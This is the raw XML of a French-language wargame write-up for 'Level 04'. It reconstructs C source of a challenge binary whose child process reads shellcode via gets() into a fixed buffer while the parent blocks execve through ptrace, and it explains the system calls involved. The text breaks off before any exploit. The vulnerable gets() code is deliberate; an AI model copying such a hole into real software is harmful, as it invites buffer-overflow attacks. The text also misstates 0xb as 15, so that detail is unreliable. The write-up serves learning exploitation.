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60A000007C1C144EE8B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003D16000018CFFF7CBF9B.svm"/>
  <manifest:file-entry manifest:media-type="" manifest:full-path="Pictures/2000000700003CAC0000221CB477A2D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font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>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list-style-name="L2">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6" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P16" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P17" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties fo:color="#6ab825" fo:font-weight="bold" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#d0d0d0" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="normal" style:font-style-asian="normal" style:font-style-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color="#3677a9"/>
    </style:style>
    <style:style style:name="T13" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>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style:font-name="Courier New" style:text-underline-style="none" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T19" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-size="11pt" style:text-underline-style="none" fo:font-weight="normal" style:font-size-asian="11pt" style:font-weight-asian="normal" style:font-size-complex="11pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties style:font-name="Courier New" fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:color="#24909d"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:color="#ffffff" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:color="#006600"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:color="#006600" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:color="#006600" fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:color="#ba2121"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22267951401886787" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P2">Level 04</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">On est sur du 32 bits ; C. On reconstruit le code source suivant :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P12">#include &lt;unistd.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;sys/types.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;sys/prctl.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;sys/ptrace.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;sys/wait.h&gt;</text:p>
      <text:p text:style-name="P13">#include &lt;signal.h&gt;</text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:span text:style-name="T1">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">main</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T1">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P15">{</text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">pid_t<text:tab/></text:span><text:span text:style-name="T6">pid;<text:tab/><text:tab/></text:span><text:span text:style-name="T8">// [esp+0xac]</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">n;<text:tab/><text:tab/></text:span><text:span text:style-name="T8">// [esp+0xa8]</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">ret;<text:tab/><text:tab/></text:span><text:span text:style-name="T8">// [esp+0x1c]</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">ret2;<text:tab/><text:tab/></text:span><text:span text:style-name="T8">// [esp+0xa0]</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">int<text:tab/></text:span><text:span text:style-name="T6">ret3;<text:tab/><text:tab/></text:span><text:span text:style-name="T8">// [esp+0xa4]</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">char<text:tab/></text:span><text:span text:style-name="T6">buff[</text:span><text:span text:style-name="T12">128</text:span><text:span text:style-name="T6">];<text:tab/></text:span><text:span text:style-name="T8">// [esp+0x20]</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">pid</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">fork();</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">int</text:span> <text:span text:style-name="T6">i</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(i</text:span> <text:span text:style-name="T6">&lt;</text:span> <text:span text:style-name="T12">128</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">buff[i++]</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T13">'\0'</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14"/>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">n</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">ret</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(pid</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">)<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T8">// Executed by child</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">prctl(PR_SET_PDEATHSIG,</text:span> <text:span text:style-name="T6">SIGHUP);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">ptrace(PTRACE_TRACEME,</text:span> <text:span text:style-name="T12">0x0</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T12">0x0</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T12">0x0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T13">"Give me some shellcode, k"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">gets(buff);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">else<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T8">// Executed by parent</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T1">while</text:span> <text:span text:style-name="T6">(n</text:span> <text:span text:style-name="T6">!=</text:span> <text:span text:style-name="T12">0xb</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T6">wait(&amp;ret);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T6">ret2</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ret;</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T1">if</text:span> <text:span text:style-name="T6">(WIFEXITED(ret)</text:span> <text:span text:style-name="T6">||</text:span> <text:span text:style-name="T6">WIFSIGNALED(ret))</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="16"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T13">"child is exiting..."</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="16"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="12"/><text:span text:style-name="T6">n</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ptrace(PTRACE_PEEKUSER,</text:span> <text:span text:style-name="T6">pid,</text:span> <text:span text:style-name="T12">0x2c</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T12">0x0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T13">"no exec() for you"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="8"/><text:span text:style-name="T6">kill(pid,</text:span> <text:span text:style-name="T12">0x9</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P14"><text:soft-page-break/><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P14"><text:s text:c="4"/><text:span text:style-name="T1">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T12">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P10">}</text:p>
      <text:p text:style-name="P1">Le code source n'était pas particulièrement difficile à reconstruire, mais son interprétation était un peu plus longue car il introduit un certain nombre de concepts nouveaux pour moi.</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Le programme commence par un <text:span text:style-name="T3">fork </text:span><text:span text:style-name="T14">classique, se dupliquant afin de créer un </text:span><text:span text:style-name="T10">child process</text:span><text:span text:style-name="T14">. Les commandes exécutées par le </text:span><text:span text:style-name="T10">child process </text:span><text:span text:style-name="T14">seront celles dans la condition </text:span><text:span text:style-name="T3">pid == 0</text:span><text:span text:style-name="T14"> ; le process parent exécutera les instructions du </text:span><text:span text:style-name="T3">else</text:span><text:span text:style-name="T14">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Le processus enfant commence par un appel à </text:span><text:span text:style-name="T3">prctl</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man2/prctl.2.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://man7.org/linux/man-pages/man2/prctl.2.html</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Cette fonction permet de manipuler "différents aspects relatifs au comportement du processus / de la thread appelante". Il y a pas mal d'options disponibles ; dans notre disassembly, la fonction était appelée comme suit :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T14">prctl(0x1, 0x1)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Pour le premier argument, les macros et leurs valeurs correspondantes sont définies dans </text:span><text:span text:style-name="T3">prctl.h</text:span><text:span text:style-name="T14">, et on voit que PR_SET_PDEATHSIG équivaut à </text:span><text:span text:style-name="T3">1</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://code.woboq.org/userspace/include/linux/prctl.h.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://code.woboq.org/userspace/include/linux/prctl.h.html</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Lorsque le premier argument de </text:span><text:span text:style-name="T3">prctl </text:span><text:span text:style-name="T14">est PR_SET_PDEATHSIG, la fonction indique quel signal transmettre au processus enfant lorsque le processus parent est arrêté / mort. Le second argument correspond alors au numéro de signal à passer à l'enfant, défini dans </text:span><text:span text:style-name="T3">sys/signal.h</text:span><text:span text:style-name="T14"> (on voit que 0x1 équivaut à SIGHUP) :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://unix.superglobalmegacorp.com/Net2/newsrc/sys/signal.h.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://unix.superglobalmegacorp.com/Net2/newsrc/sys/signal.h.html</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">On voit ensuite un </text:span><text:span text:style-name="T3">appel à ptrace</text:span><text:span text:style-name="T14"> ; en disassembly, il avait cette tête :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">ptrace(0x0, 0x0, 0x0, 0x0)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Le comportement de </text:span><text:span text:style-name="T3">ptrace </text:span><text:span text:style-name="T14">et les arguments de la fonction dépendent du </text:span><text:span text:style-name="T3">1er argument</text:span><text:span text:style-name="T14">, qui définit l'action à entreprendre ; les macros sont définies dans le man :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://man7.org/linux/man-pages/man2/ptrace.2.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://man7.org/linux/man-pages/man2/ptrace.2.html</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Les valeurs des macros sont définies dans </text:span><text:span text:style-name="T3">ptrace.h</text:span><text:span text:style-name="T14"> :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86/sys/ptrace.h.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T14">https://code.woboq.org/userspace/glibc/sysdeps/unix/sysv/linux/x86/sys/ptrace.h.html</text:span></text:a><text:span text:style-name="T14"> </text:span></text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">On voit donc que la valeur <text:span text:style-name="T3">0x0 </text:span><text:span text:style-name="T14">correspond bien à </text:span><text:span text:style-name="T3">PTRACE_TRACEME</text:span><text:span text:style-name="T14">. Concernant </text:span><text:span text:style-name="T3">ptrace </text:span><text:span text:style-name="T14">de manière plus générale, la page man décrit ce system call de la façon suivante :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">'</text:span><text:span text:style-name="T10">The ptrace() system call provides a means by which one process (the "tracer") may observe and control the execution of another process (the "tracee"), and examine and change the tracee's memory and registers</text:span><text:span text:style-name="T14">'.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T14">Il s'agit en fait du system call utilisé par les </text:span><text:span text:style-name="T3">debuggers </text:span><text:span text:style-name="T14">(gdb, radare2...) afin précisément de débugger un programme. Un </text:span><text:span text:style-name="T11">tracee </text:span><text:span text:style-name="T16">doit d'abord être attaché au </text:span><text:span text:style-name="T11">tracer </text:span><text:span text:style-name="T16">(le debugger), ce qui peut être fait par le debugger qui lance le programme (</text:span><text:span text:style-name="T19">gdb &lt;program name&gt;</text:span><text:span text:style-name="T16">), ou le debugger peut également s'attacher à un running process.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T16">Quoi qu'il en soit, le </text:span><text:span text:style-name="T17">system call ptrace </text:span><text:span text:style-name="T16">permet d'effectuer toutes les actions de debugging nécessaires au </text:span><text:span text:style-name="T11">tracee</text:span><text:span text:style-name="T16">. Comme prctl, la structure de la fonction </text:span><text:span text:style-name="T17">ptrace </text:span><text:span text:style-name="T16">est la suivante, le premier argument déterminant la signification des suivants :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">On ne va pas lister toutes les actions possibles, mais par exemple :</text:span></text:p>
      <text:list xml:id="list1320883635334391511" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T18">PTRACE_PEEKDATA</text:span><text:span text:style-name="T16"> permet de lire un </text:span><text:span text:style-name="T17">word </text:span><text:span text:style-name="T16">de la mémoire du processus </text:span><text:span text:style-name="T11">tracee </text:span><text:span text:style-name="T16">(ses instructions / la mémoire du programme lui-même). Le mot est lu à l'adresse </text:span><text:span text:style-name="T17">addr</text:span><text:span text:style-name="T16"> (data ignored).</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T18">PTRACE_PEEKUSER</text:span><text:span text:style-name="T16"> permet de lire un </text:span><text:span text:style-name="T17">word </text:span><text:span text:style-name="T16">à l'</text:span><text:span text:style-name="T17">offset </text:span><text:span text:style-name="T16">addr "</text:span><text:span text:style-name="T11">in the tracee's USER area, which holds the registers and other information about the process</text:span><text:span text:style-name="T16">". Cet appel permet donc de récupérer l'état des registres.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T18">PTRACE_POKEDATA</text:span><text:span text:style-name="T16"> agit comme PEEKDATA sauf qu'au lieu de lire, on écrit </text:span><text:span text:style-name="T17">data </text:span><text:span text:style-name="T16">à </text:span><text:span text:style-name="T17">addr</text:span><text:span text:style-name="T16"> dans le processus </text:span><text:span text:style-name="T11">tracee</text:span><text:span text:style-name="T16">.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P4"><text:span text:style-name="T16">Etc...</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Bref, dans notre cas le processus enfant appelle </text:span><text:span text:style-name="T17">ptrace </text:span><text:span text:style-name="T16">avec PTRACE_TRACEME en premier argument ("</text:span><text:span text:style-name="T11">Indicate that this process is to be traced by its parent</text:span><text:span text:style-name="T16">"). Un appel à </text:span><text:span text:style-name="T17">gets </text:span><text:span text:style-name="T16">est ensuite effectué, constituant un potentiel buffer overflow. Le processus enfant, ensuite, </text:span><text:span text:style-name="T17">returns</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Examinons maintenant la boucle du processus parent. Un </text:span><text:span text:style-name="T17">wait </text:span><text:span text:style-name="T16">est d'abord opéré, afin d'attendre que le processus enfant change d'état. Si un changement d'état est détecté dans le processus enfant, on vérifie si ce processus enfant a </text:span><text:span text:style-name="T17">exit </text:span><text:span text:style-name="T16">ou s'est fait </text:span><text:span text:style-name="T17">interrompre par un signal</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">En assembly, la synthaxe traduite sans macro :</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">if (ret &amp; 0x7f == 0 || ((ret &amp; 0x7f) &gt;&gt; 1) &gt; 0</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">On a récupéré l'équivalent en macro dans </text:span><text:span text:style-name="T17">waitstatus.h </text:span><text:span text:style-name="T16">:</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://code.woboq.org/userspace/glibc/bits/waitstatus.h.html" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T15">https://code.woboq.org/userspace/glibc/bits/waitstatus.h.html</text:span></text:a><text:span text:style-name="T16"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Bref, on attend le processus enfant, et si celui-ci a quitté ou s'est fait terminer, on quitte le processus parent. Si cependant le processus enfant a changé d'état sans terminer (exit / signal), on fait l'appel suivant à </text:span><text:span text:style-name="T17">ptrace</text:span><text:span text:style-name="T16"> :</text:span></text:p>
      <text:p text:style-name="P5"><text:span text:style-name="T16">n = ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0x0);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Cela va retourner </text:span><text:span text:style-name="T17">le contenu du registre eax </text:span><text:span text:style-name="T16">du processus enfant. Comment savoir que l'offset 0x2c correspond au registre EAX (</text:span><text:span text:style-name="T17">sys/reg.h</text:span><text:span text:style-name="T16">) :</text:span></text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="https://stackoverflow.com/questions/55048715/how-to-get-the-offset-of-a-given-cpu-register-in-rust" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T15">https://stackoverflow.com/questions/55048715/how-to-get-the-offset-of-a-given-cpu-register-in-rust</text:span></text:a><text:span text:style-name="T16"> </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">La valeur du register </text:span><text:span text:style-name="T17">eax </text:span><text:span text:style-name="T16">est stockée dans </text:span><text:span text:style-name="T17">n</text:span><text:span text:style-name="T16"> ; elle est ensuite comparée à </text:span><text:span text:style-name="T17">0xb </text:span><text:span text:style-name="T16">(15) : si la valeur du registre </text:span><text:span text:style-name="T17">eax </text:span><text:span text:style-name="T16">est en effet égale à 15, un message est affiché et le processus enfant est </text:span><text:span text:style-name="T17">kill</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">La valeur </text:span><text:span text:style-name="T17">0xb (15) correspond au numéro de syscall execv()</text:span><text:span text:style-name="T16">. Rappelons que pour effectuer un appel système en 32bits : </text:span><text:span text:style-name="T17">eax </text:span><text:span text:style-name="T16">= syscall number ; args in </text:span><text:span text:style-name="T17">ebx – ecx – edx – esi – edi – ebp</text:span><text:span text:style-name="T16">.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16"/></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">Ainsi, la boucle du processus parent doit être comprise comme suit :</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt; Wait for child process to change state.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T16">&gt; If child process terminated (exit / signal), all good, display message and return 0.</text:span></text:p>
